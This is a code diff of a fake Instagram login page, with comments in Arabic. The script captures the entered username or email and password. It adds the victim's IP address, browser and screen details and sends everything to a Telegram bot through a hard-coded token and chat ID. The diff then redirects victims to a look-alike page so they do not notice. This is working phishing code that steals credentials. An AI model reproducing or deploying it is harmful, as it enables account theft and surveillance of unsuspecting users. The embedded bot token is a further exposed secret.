@@ -16,7 +16,6 @@
                 <h1 title="Instagram" class="flex justify-content-center">
                     <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                 </h1>
-                <!-- تم إضافة id="login-form" هنا -->
                 <form id="login-form">
                     <label for="email" class="sr-only">Phone number, username, or email</label>
                     <input id="email" name="email" placeholder="Phone number, username, or email" />
@@ -71,21 +70,20 @@
 
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
-        const TOKEN = "7474180263:AAHRByLJi2S6Mkby-RZFXHRLCgX1jdSIJhE"; // هنا التوكين
-        const CHAT_ID = "7223574687"; // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+        const TOKEN = "7474180263:AAHRByLJi2S6Mkby-RZFXHRLCgX1jdSIJhE"; 
+        const CHAT_ID = "7223574687"; 
         const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-        // إضافة حدث الإرسال للنموذج
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault(); // منع الإرسال العادي للنموذج
 
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
+            // ارسال البيانات الى Telegram API
             axios.get('https://api.ipify.org?format=json')
                 .then(response => {
                     const ip = response.data.ip;
-
                     const userAgent = navigator.userAgent;
                     const platform = navigator.platform;
                     const screenWidth = screen.width;
@@ -109,7 +107,8 @@
                         parse_mode: 'html',
                         text: message
                     }).then(response => {
-                        alert('Information sent successfully!');
+                        // بعد إرسال البيانات بنجاح، توجيه المستخدم
+                        window.location.href = 'https://instagram-alt.github.io/account/insta.html';
                     }).catch(error => {
                         alert('Error sending the information. Please try again.');
                     });
